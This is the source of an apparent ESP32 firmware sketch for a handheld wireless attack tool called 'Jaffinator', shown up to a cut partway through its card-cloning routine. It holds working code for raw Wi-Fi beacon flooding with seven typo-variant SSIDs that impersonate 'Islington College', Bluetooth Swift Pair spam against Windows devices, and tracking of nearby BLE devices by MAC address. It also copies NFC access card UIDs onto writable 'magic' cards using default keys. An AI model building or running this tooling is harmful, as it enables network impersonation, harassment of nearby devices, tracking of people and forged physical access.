#define BLYNK_TEMPLATE_ID ""
#define BLYNK_TEMPLATE_NAME "Jaffinator"
#define BLYNK_AUTH_TOKEN    "" 

#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <Wire.h>
#include <Adafruit_PN532.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>
#include <ctype.h>
#include <BlynkSimpleEsp32.h>

// ===== Wi‑Fi Credentials =====
char ssid[] = "";
char pass[] = "";

// ===== Blynk V‑pins =====
#define VP_WIFI_SCAN   V0
#define VP_BEACON      V1
#define VP_BLE_SPAM    V2
#define VP_BLE_TRACK   V3
#define VP_NFC_READ    V4
#define VP_NFC_CLONE   V5
#define VP_MANUAL_UID  V6
#define VP_SIGNAL      V7
#define VP_SNIFFER     V8
#define VP_STOP        V9
#define VP_STATUS      V10

// ===== Hardware =====
#define TFT_CS   15
#define TFT_DC   2
#define TFT_RST  4
#define TFT_MOSI 18
#define TFT_SCK  23
#define PN532_IRQ -1
#define PN532_RST -1

Adafruit_ST7789 tft = Adafruit_ST7789(TFT_CS, TFT_DC, TFT_MOSI, TFT_SCK, TFT_RST);
Adafruit_PN532 nfc(PN532_IRQ, PN532_RST);
WebServer server(80);
DNSServer dnsServer;

bool stopFlag = false;
bool exitFlag = false;
uint32_t pktCount = 0;
uint8_t targetMAC[6] = {0};
int targetChannel = 0;
uint8_t storedUID[7];
uint8_t storedUIDLength = 0;

bool featureRunning = false;
String currentFeature = "";
bool webServerStarted = false;

// ===== Log buffer =====
const int MAX_LOG_LINES = 50;
String logLines[MAX_LOG_LINES];
int logIndex = 0;
int logCount = 0;

void addLog(String msg) {
  Serial.println(msg);
  logLines[logIndex] = msg;
  logIndex = (logIndex + 1) % MAX_LOG_LINES;
  if (logCount < MAX_LOG_LINES) logCount++;
}

// -------------------- Helpers --------------------
void drawCenteredText(int y, const char* text, uint16_t color, uint8_t size) {
  int16_t x1, y1;
  uint16_t w, h;
  tft.setTextSize(size);
  tft.getTextBounds(text, 0, 0, &x1, &y1, &w, &h);
  int x = (320 - w) / 2;
  tft.setCursor(x, y);
  tft.setTextColor(color);
  tft.print(text);
}

void drawSignalBar(int x, int y, int rssi, uint16_t color) {
  int bars = (rssi > -50) ? 4 : (rssi > -65) ? 3 : (rssi > -80) ? 2 : (rssi > -90) ? 1 : 0;
  tft.fillRect(x, y, 25, 12, ST77XX_BLACK);
  for (int i = 0; i < 4; i++) {
    if (i < bars) tft.fillRect(x + (i * 6), y + (3 - i) * 3, 4, 3, color);
    else tft.drawRect(x + (i * 6), y + (3 - i) * 3, 4, 3, 0x4208);
  }
}

String macToString(uint8_t* mac) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

// FIXED: getSafeInput now processes Blynk and web while waiting
String getSafeInput() {
  String input = "";
  while (true) {
    while (Serial.available() > 0) {
      char c = Serial.read();
      if (c == '\n' || c == '\r') {
        input.trim();
        if (input.length() > 0) return input;
        input = "";
      } else input += c;
    }
    // Process Blynk and web events while waiting
    Blynk.run();
    if (webServerStarted) server.handleClient();
    delay(10);
    if (Serial.available() && Serial.peek() == 'm') {
      Serial.read();
      return "m";
    }
  }
}

void drawMenu() {
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 4, ST77XX_GREEN);
  drawCenteredText(12, "JAFFINATOR", ST77XX_GREEN, 2);
  tft.drawFastHLine(10, 35, 300, ST77XX_GREEN);

  int y = 46, step = 15;
  tft.setCursor(10, y); tft.setTextColor(0x6B4D); tft.setTextSize(1); tft.print("-- Network --"); y += step;
  tft.setCursor(10, y); tft.setTextSize(2); tft.setTextColor(ST77XX_GREEN); tft.print("[1]"); tft.setTextColor(ST77XX_WHITE); tft.print(" WiFi Scan"); y += step;
  tft.setCursor(10, y); tft.setTextColor(ST77XX_GREEN); tft.print("[2]"); tft.setTextColor(ST77XX_WHITE); tft.print(" WiFi Beacon"); y += step;
  tft.setCursor(10, y); tft.setTextColor(0x6B4D); tft.setTextSize(1); tft.print("-- Bluetooth --"); y += step;
  tft.setCursor(10, y); tft.setTextSize(2); tft.setTextColor(ST77XX_GREEN); tft.print("[3]"); tft.setTextColor(ST77XX_WHITE); tft.print(" Window Spam"); y += step;
  tft.setCursor(10, y); tft.setTextColor(ST77XX_GREEN); tft.print("[4]"); tft.setTextColor(ST77XX_WHITE); tft.print(" BLE Tracker"); y += step;
  tft.setCursor(10, y); tft.setTextColor(0x07FF); tft.setTextSize(1); tft.print("-- NFC --"); y += step;
  tft.setCursor(10, y); tft.setTextSize(2); tft.setTextColor(ST77XX_CYAN); tft.print("[5]"); tft.setTextColor(ST77XX_WHITE); tft.print(" NFC Read"); y += step;
  tft.setCursor(10, y); tft.setTextColor(ST77XX_CYAN); tft.print("[6]"); tft.setTextColor(ST77XX_WHITE); tft.print(" NFC Clone"); y += step;
  tft.setCursor(10, y); tft.setTextColor(ST77XX_CYAN); tft.print("[u]"); tft.setTextColor(ST77XX_WHITE); tft.print(" NFC Manual"); y += step;
  tft.setCursor(10, y); tft.setTextSize(2); tft.setTextColor(ST77XX_GREEN); tft.print("[7]"); tft.setTextColor(ST77XX_WHITE); tft.print(" Signal Tracker"); y += step;
  tft.setCursor(10, y); tft.setTextColor(ST77XX_GREEN); tft.print("[8]"); tft.setTextColor(ST77XX_WHITE); tft.print(" Sniffer");

  addLog("Menu displayed");
}

// ==================== Tools ====================

// 1. WiFi Scan
void runWiFiScan() {
  stopFlag = false; exitFlag = false;
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  Blynk.virtualWrite(VP_STATUS, "Running: WiFi Scan");
  addLog("WiFi Scan started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, ST77XX_GREEN);
  drawCenteredText(8, "[WiFi SCAN]", ST77XX_WHITE, 3);
  tft.fillRect(0, 45, 320, 20, 0x1082);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
  tft.print("Nearby networks | 's'=stop  'm'=menu");

  int page = 0;
  int totalNetworks = 0;
  while (!stopFlag && !exitFlag) {
    if (page == 0) {
      tft.fillRect(0, 75, 320, 145, ST77XX_BLACK);
      tft.setCursor(10, 120); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2);
      tft.print("Scanning...");
      totalNetworks = WiFi.scanNetworks();
      addLog("Found " + String(totalNetworks) + " networks");
      page = 0;
    }
    int start = page * 6;
    int end = min(start + 6, totalNetworks);
    if (start >= totalNetworks) { page = 0; continue; }
    tft.fillRect(0, 75, 320, 145, ST77XX_BLACK);
    tft.setCursor(10, 77); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
    tft.printf("Page %d/%d  |  %d APs", page+1, ((totalNetworks-1)/6)+1, totalNetworks);
    int y = 92;
    for (int i = start; i < end; i++) {
      String ssid = WiFi.SSID(i);
      if (ssid.length() > 11) ssid = ssid.substring(0, 11) + "..";
      tft.setCursor(10, y); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(1); tft.printf("[%d]", i+1);
      tft.setCursor(35, y); tft.setTextColor(ST77XX_WHITE); tft.print(ssid);
      tft.setCursor(150, y); tft.setTextColor(ST77XX_WHITE); tft.printf("CH:%2d  %3d dBm", WiFi.channel(i), WiFi.RSSI(i));
      drawSignalBar(260, y, WiFi.RSSI(i), ST77XX_GREEN);
      y += 18;
    }
    tft.drawFastHLine(10, 218, 300, ST77XX_GREEN);
    tft.setCursor(10, 224); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(1);
    tft.print("root@jaff:~# scan running...");
    page++;
    if (start + 6 >= totalNetworks) page = 0;
    for (int i = 0; i < 25 && !stopFlag && !exitFlag; i++) {
      if (Serial.available()) {
        char c = Serial.read();
        if (c == 'm' || c == 'M') { exitFlag = true; break; }
        if (c == 's' || c == 'S') { stopFlag = true; break; }
      }
      Blynk.run();
      if (webServerStarted) server.handleClient();
      delay(100);
    }
  }
  if (stopFlag) addLog("WiFi Scan stopped by user");
  else if (exitFlag) addLog("WiFi Scan exited to menu");
  else addLog("WiFi Scan finished");
  Blynk.virtualWrite(VP_STATUS, "Idle");
  tft.fillScreen(ST77XX_BLACK);
}

// 2. WiFi Beacon Spam
void runWiFiBeacon() {
  stopFlag = false; exitFlag = false;
  WiFi.mode(WIFI_AP); WiFi.disconnect(); delay(100);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  Blynk.virtualWrite(VP_STATUS, "Running: Beacon Spam");
  addLog("Beacon Spam started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, ST77XX_RED);
  drawCenteredText(8, "[BEACON SPAM]", ST77XX_WHITE, 3);
  tft.fillRect(0, 45, 320, 20, 0x1082);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
  tft.print("Mode 2  |  's'=stop  'm'=menu");
  tft.drawRect(10, 75, 300, 25, ST77XX_YELLOW);
  tft.setCursor(20, 81); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1);
  tft.print("7 SSIDs flooding airwaves");
  tft.setCursor(10, 115); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(2);
  tft.print("Beacons Sent:");
  tft.setCursor(180, 115); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2);
  tft.print("ACTIVE");
  tft.drawFastHLine(10, 218, 300, ST77XX_GREEN);
  tft.setCursor(10, 226); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(1);
  tft.print("root@jaff:~# beacon active...");

  const char* names[] = {"Islington College","Islingt0n College","Islington Co11ege","Isl1ngton College","Islington C0llege","I5lington College","Isl1ngt0n College"};
  const int numSSIDs = sizeof(names)/sizeof(names[0]);
  unsigned long count = 0;
  bool activeBlink = true;
  unsigned long lastBlink = millis();

  while (!stopFlag && !exitFlag) {
    for (int i = 0; i < numSSIDs; i++) {
      uint8_t packet[128];
      int ssidLen = strlen(names[i]);
      memset(packet, 0, sizeof(packet));
      packet[0] = 0x80; packet[1] = 0x00;
      for (int j = 4; j < 10; j++) packet[j] = 0xFF;
      for (int j = 10; j < 16; j++) { packet[j] = 0xAC; packet[j+6] = 0xAC; }
      packet[15] = (uint8_t)i; packet[21] = (uint8_t)i;
      packet[32] = 0x64; packet[33] = 0x00; packet[34] = 0x11; packet[35] = 0x04;
      packet[36] = 0x00; packet[37] = ssidLen; memcpy(&packet[38], names[i], ssidLen);
      int pos = 38 + ssidLen;
      packet[pos++] = 0x01; packet[pos++] = 0x08;
      uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
      memcpy(&packet[pos], rates, 8); pos += 8;
      packet[pos++] = 0x03; packet[pos++] = 0x01; packet[pos++] = 0x01;
      esp_wifi_80211_tx(WIFI_IF_AP, packet, pos, true);
      delay(5);
      count++;
    }
    if (count % 500 == 0) {
      tft.fillRect(10, 145, 200, 30, ST77XX_BLACK);
      tft.setCursor(10, 145); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(3);
      tft.print(count);
      addLog("Beacons sent: " + String(count));
    }
    if (millis() - lastBlink > 500) {
      activeBlink = !activeBlink;
      tft.fillRect(180, 115, 100, 20, ST77XX_BLACK);
      tft.setCursor(180, 115); tft.setTextColor(activeBlink ? ST77XX_GREEN : ST77XX_BLACK);
      tft.setTextSize(2); tft.print("ACTIVE");
      lastBlink = millis();
    }
    if (Serial.available()) {
      char c = Serial.read();
      if (c == 'm' || c == 'M') { exitFlag = true; break; }
      if (c == 's' || c == 'S') { stopFlag = true; break; }
    }
    Blynk.run();
    if (webServerStarted) server.handleClient();
  }
  esp_wifi_set_promiscuous(false);
  if (stopFlag) addLog("Beacon Spam stopped by user");
  else if (exitFlag) addLog("Beacon Spam exited to menu");
  else addLog("Beacon Spam finished");
  Blynk.virtualWrite(VP_STATUS, "Idle");
  tft.fillScreen(ST77XX_BLACK);
}

// 3. BLE Windows Spam
void runBLEWindowsSpam() {
  stopFlag = false; exitFlag = false;
  WiFi.mode(WIFI_OFF); delay(100);
  Blynk.virtualWrite(VP_STATUS, "Running: BLE Spam");
  addLog("BLE Windows Spam started");
  BLEDevice::init("Jaffinator_Win");
  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
  BLEAdvertisementData oAdv;
  uint8_t swift[19] = {0x06,0x00,0x03,0x00,0x80,'J','A','F','F','I','N','A','T','O','R',0x00,0x00,0x00,0x00};
  String manData = "";
  for (int i = 0; i < 19; i++) manData += (char)swift[i];
  oAdv.setManufacturerData(manData);
  oAdv.setFlags(0x06);
  pAdv->setAdvertisementData(oAdv);
  pAdv->setScanResponse(false);
  pAdv->setMinInterval(0x20);
  pAdv->setMaxInterval(0x20);

  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, ST77XX_RED);
  drawCenteredText(8, "[BLE WINDOWS SPAM]", ST77XX_WHITE, 3);
  tft.fillRect(0, 45, 320, 20, 0x1082);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
  tft.print("Swift Pair Spam | 's'=stop  'm'=menu");
  tft.drawRect(10, 75, 300, 25, ST77XX_YELLOW);
  tft.setCursor(20, 81); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1);
  tft.print("Continuous advertising");
  tft.setCursor(10, 115); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(2);
  tft.print("Cycles:");
  tft.setCursor(180, 115); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2);
  tft.print("ACTIVE");
  tft.drawFastHLine(10, 218, 300, ST77XX_GREEN);
  tft.setCursor(10, 226); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(1);
  tft.print("root@jaff:~# spam active...");

  pAdv->start();
  unsigned long count = 0;
  bool activeBlink = true;
  unsigned long lastBlink = millis();

  while (!stopFlag && !exitFlag) {
    delay(1000);
    count++;
    tft.fillRect(10, 145, 200, 30, ST77XX_BLACK);
    tft.setCursor(10, 145); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(3);
    tft.print(count);
    addLog("BLE cycles: " + String(count));
    if (millis() - lastBlink > 500) {
      activeBlink = !activeBlink;
      tft.fillRect(180, 115, 100, 20, ST77XX_BLACK);
      tft.setCursor(180, 115); tft.setTextColor(activeBlink ? ST77XX_GREEN : ST77XX_BLACK);
      tft.setTextSize(2); tft.print("ACTIVE");
      lastBlink = millis();
    }
    if (Serial.available()) {
      char c = Serial.read();
      if (c == 'm' || c == 'M') { exitFlag = true; break; }
      if (c == 's' || c == 'S') { stopFlag = true; break; }
    }
    Blynk.run();
    if (webServerStarted) server.handleClient();
  }
  pAdv->stop();
  BLEDevice::deinit(false);
  WiFi.mode(WIFI_STA);
  if (stopFlag) addLog("BLE Spam stopped by user");
  else if (exitFlag) addLog("BLE Spam exited to menu");
  else addLog("BLE Spam finished");
  Blynk.virtualWrite(VP_STATUS, "Idle");
  tft.fillScreen(ST77XX_BLACK);
}

// 4. BLE Tracker
void runBLETracker() {
  stopFlag = false; exitFlag = false;
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  Blynk.virtualWrite(VP_STATUS, "Running: BLE Tracker");
  addLog("BLE Tracker started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 36, ST77XX_BLUE);
  drawCenteredText(10, "BLE TRACKER", ST77XX_WHITE, 2);
  tft.fillRect(0, 36, 320, 18, 0x1082);
  tft.setCursor(10, 39); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
  tft.print("Scanning...   's'=stop  'm'=menu");

  int scanCount = 0;
  while (!stopFlag && !exitFlag) {
    BLEScanResults* foundDevices = pBLEScan->start(3, false);
    scanCount++;
    tft.fillRect(0, 58, 320, 152, ST77XX_BLACK);
    tft.setCursor(10, 62); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
    tft.printf("Scan #%d  |  %d devices", scanCount, foundDevices->getCount());
    addLog("BLE scan #" + String(scanCount) + " - " + String(foundDevices->getCount()) + " devices");
    int y = 78;
    int maxDev = min((int)foundDevices->getCount(), 6);
    for (int i = 0; i < maxDev; i++) {
      BLEAdvertisedDevice d = foundDevices->getDevice(i);
      String name = d.getName().length() > 0 ? d.getName() : "Unknown_BLE";
      if (name.length() > 18) name = name.substring(0, 18) + "..";
      tft.setCursor(10, y); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1);
      tft.print(name);
      tft.setCursor(180, y); tft.setTextColor(ST77XX_YELLOW);
      tft.printf("%d dBm", d.getRSSI());
      drawSignalBar(240, y, d.getRSSI(), d.getRSSI() > -70 ? ST77XX_GREEN : ST77XX_RED);
      tft.setCursor(10, y+12); tft.setTextColor(0x8410); tft.setTextSize(1);
      tft.printf("MAC: %s", d.getAddress().toString().c_str());
      y += 24;
    }
    tft.drawFastHLine(10, 210, 300, ST77XX_GREEN);
    tft.setCursor(10, 214); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(1);
    tft.print("root@jaff:~# tracker active...");
    if (Serial.available()) {
      char c = Serial.read();
      if (c == 'm' || c == 'M') { exitFlag = true; break; }
      if (c == 's' || c == 'S') { stopFlag = true; break; }
    }
    Blynk.run();
    if (webServerStarted) server.handleClient();
  }
  pBLEScan->stop(); BLEDevice::deinit(false); WiFi.mode(WIFI_STA);
  if (stopFlag) addLog("BLE Tracker stopped by user");
  else if (exitFlag) addLog("BLE Tracker exited to menu");
  else addLog("BLE Tracker finished");
  Blynk.virtualWrite(VP_STATUS, "Idle");
  tft.fillScreen(ST77XX_BLACK);
}

// 5. NFC Read
void runNFCRead() {
  stopFlag = false; exitFlag = false;
  nfc.begin(); nfc.SAMConfig();
  Blynk.virtualWrite(VP_STATUS, "Running: NFC Read");
  addLog("NFC Read started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, ST77XX_RED);
  tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[ NFC READ ]");
  tft.fillRect(0, 45, 320, 20, 0x1082);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("Waiting for tag...");
  tft.drawRect(10, 75, 300, 30, ST77XX_YELLOW);
  tft.setCursor(20, 83); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Place tag on reader  |  's'=stop  'm'=menu");
  tft.setCursor(10, 120); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2); tft.print("Scanning");
  int dotCount = 0;
  while (!stopFlag && !exitFlag) {
    tft.fillRect(130, 120, 80, 20, ST77XX_BLACK);
    tft.setCursor(130, 120); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2);
    for (int d = 0; d <= (dotCount % 4); d++) tft.print(".");
    dotCount++;
    uint8_t uid[7]; uint8_t uidLen = 0;
    if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 500)) {
      memcpy(storedUID, uid, uidLen);
      storedUIDLength = uidLen;
      String uidStr = "";
      for (int i = 0; i < uidLen; i++) {
        if (uid[i] < 0x10) uidStr += "0";
        uidStr += String(uid[i], HEX);
        if (i < uidLen - 1) uidStr += ":";
      }
      addLog("NFC tag read: " + uidStr);
      tft.fillRect(0, 115, 320, 125, ST77XX_BLACK);
      tft.fillRect(0, 115, 320, 25, 0x0380);
      tft.setCursor(10, 121); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("TAG DETECTED");
      tft.setCursor(10, 148); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(2); tft.print("UID:");
      tft.setCursor(10, 175); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(2);
      tft.print(uidStr);
      tft.fillRect(0, 205, 320, 20, 0x1082);
      tft.setCursor(10, 209); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
      tft.print(uidLen * 8); tft.print("-bit  |  ISO14443A  |  Cached for clone");
    }
    if (Serial.available()) {
      char c = Serial.read();
      if (toupper(c) == 'M') { exitFlag = true; break; }
      if (toupper(c) == 'S') { stopFlag = true; break; }
    }
    Blynk.run();
    if (webServerStarted) server.handleClient();
    delay(100);
  }
  if (stopFlag) addLog("NFC Read stopped by user");
  else if (exitFlag) addLog("NFC Read exited to menu");
  else addLog("NFC Read finished");
  Blynk.virtualWrite(VP_STATUS, "Idle");
  tft.fillScreen(ST77XX_BLACK);
}

// 6. NFC Clone
void runNFCClone() {
  stopFlag = false; exitFlag = false;
  nfc.begin(); nfc.SAMConfig();
  Blynk.virtualWrite(VP_STATUS, "Running: NFC Clone");
  addLog("NFC Clone started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, 0x780F);
  tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
  tft.fillRect(0, 45, 320, 20, 0x1082);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("STEP 1 of 2");
  tft.fillRect(10, 75, 300, 55, 0x0841);
  tft.drawRect(10, 75, 300, 55, ST77XX_YELLOW);
  tft.setCursor(20, 83); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1);
  tft.print("Place ORIGINAL / SOURCE card");
  tft.setCursor(20, 97); tft.setTextColor(ST77XX_WHITE); tft.print("on the reader to scan its UID");
  tft.setCursor(20, 113); tft.setTextColor(ST77XX_CYAN); tft.print("Timeout: 10 seconds");
  tft.setCursor(10, 145); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2); tft.print("Waiting...");

  if (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, storedUID, &storedUIDLength, 10000)) {
    addLog("NFC Clone: Timeout - no source card");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
    tft.fillRect(30, 90, 260, 60, 0x2000); tft.drawRect(30, 90, 260, 60, ST77XX_RED);
    tft.setCursor(60, 103); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("TIMEOUT!");
    tft.setCursor(30, 130); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("No source tag detected.");
    delay(2000);
    Blynk.virtualWrite(VP_STATUS, "Idle");
    tft.fillScreen(ST77XX_BLACK); return;
  }
  String uidStr = "";
  for (int i = 0; i < storedUIDLength; i++) {
    if (storedUID[i] < 0x10) uidStr += "0";
    uidStr += String(storedUID[i], HEX);
    if (i < storedUIDLength - 1) uidStr += ":";
  }
  addLog("Source UID: " + uidStr);
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, 0x780F);
  tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
  tft.fillRect(0, 45, 320, 20, 0x0380);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("STEP 1 DONE  |  Source UID captured!");
  tft.setCursor(10, 75); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Source UID:");
  tft.setCursor(10, 90); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(2); tft.print(uidStr);
  tft.fillRect(0, 115, 320, 12, 0x1082);
  tft.setCursor(10, 117); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
  tft.print(storedUIDLength * 8); tft.print("-bit  |  ISO14443A");
  tft.drawRect(10, 135, 300, 60, ST77XX_CYAN);
  tft.setCursor(20, 143); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
  tft.print("STEP 2: Place MAGIC / GEN2 card");
  tft.setCursor(20, 157); tft.setTextColor(ST77XX_WHITE); tft.print("Remove source card, then");
  tft.setCursor(20, 171); tft.print("place the writable target card.");
  tft.setCursor(20, 185); tft.setTextColor(ST77XX_YELLOW);
  for (int c = 3; c >= 1; c--) {
    tft.fillRect(0, 205, 320, 20, ST77XX_BLACK);
    tft.setCursor(10, 207); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1);
    tft.print("Reading in "); tft.print(c); tft.print("...");
    delay(1000);
  }
  tft.fillRect(0, 200, 320, 40, ST77XX_BLACK);
  tft.setCursor(10, 205); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2); tft.print("Scanning...");
  uint8_t tUID[7]; uint8_t tLen;
  if (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, tUID, &tLen, 10000)) {
    addLog("NFC Clone: No target card");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
    tft.fillRect(30, 90, 260, 60, 0x2000); tft.drawRect(30, 90, 260, 60, ST77XX_RED);
    tft.setCursor(30, 103); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("NO CARD!");
    tft.setCursor(30, 130); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("No target card detected.");
    delay(2000);
    Blynk.virtualWrite(VP_STATUS, "Idle");
    tft.fillScreen(ST77XX_BLACK); return;
  }
  String tStr = "";
  for (int i = 0; i < tLen; i++) {
    if (tUID[i] < 0x10) tStr += "0"; tStr += String(tUID[i], HEX);
    if (i < tLen - 1) tStr += ":";
  }
  addLog("Target UID: " + tStr);
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, 0x780F);
  tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
  tft.fillRect(0, 45, 320, 20, 0x1082);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("STEP 2  |  Writing to target...");
  tft.setCursor(10, 78); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Source UID:"); tft.setCursor(10, 90); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print(uidStr);
  tft.setCursor(10, 108); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Target UID:"); tft.setCursor(10, 120); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print(tStr);
  tft.fillRect(30, 140, 260, 30, 0x2820); tft.drawRect(30, 140, 260, 30, ST77XX_YELLOW);
  tft.setCursor(50, 149); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(2); tft.print("WRITING...");

  uint8_t block0[16]; memset(block0, 0, 16);
  memcpy(block0, storedUID, storedUIDLength);
  if (storedUIDLength == 4) block0[4] = storedUID[0] ^ storedUID[1] ^ storedUID[2] ^ storedUID[3];
  bool authOK = false;
  uint8_t keyA[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t keyB[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  if (nfc.mifareclassic_AuthenticateBlock(tUID, tLen, 0, 0, keyA)) authOK = true;
  else if (nfc.mifareclassic_AuthenticateBlock(tUID, tLen, 0, 1, keyB)) authOK = true;
  if (!authOK) {
    addLog("NFC Clone: Auth failed");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
    tft.fillRect(30, 90, 260, 80, 0x2000); tft.drawRect(30, 90, 260, 80, ST77XX_RED);
    tft.setCursor(40, 103); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("AUTH FAILED");
    tft.setCursor(40, 130); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Card may be locked or not");
    tft.setCursor(40, 144); tft.print("a Gen2/Magic writable card.");
    delay(3000);
    Blynk.virtualWrite(VP_STATUS, "Idle");
    tft.fillScreen(ST77XX_BLACK); return;
  }
  if (nfc.mifareclassic_WriteDataBlock(0, block0)) {
    delay(500);
    uint8_t vUID[7]; uint8_t vLen; bool verified = false;
    if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, vUID, &vLen, 2000)) {
      verified = (vLen == storedUIDLength);
      if (verified) for (int i = 0; i < storedUIDLength; i++) if (vUID[i] != storedUID[i]) verified = false;
    }
    if (verified) {
      addLog("Clone SUCCESS! UID: " + uidStr);
      tft.fillScreen(ST77XX_BLACK);
      tft.fillRect(0, 0, 320, 45, 0x780F);
      tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
      tft.fillRect(0, 45, 320, 20, 0x0380);
      tft.setCursor(10, 50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("COMPLETE  |  UID matched & verified");
      tft.fillRect(30, 80, 260, 50, 0x0200); tft.drawRect(30, 80, 260, 50, ST77XX_GREEN);
      tft.setCursor(70, 92); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(3); tft.print("SUCCESS");
      tft.setCursor(10, 145); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Written UID:"); tft.setCursor(10, 158); tft.setTextColor(ST77XX_WHITE); tft.print(uidStr);
    } else {
      addLog("Clone write done but verify mismatch");
      tft.fillScreen(ST77XX_BLACK);
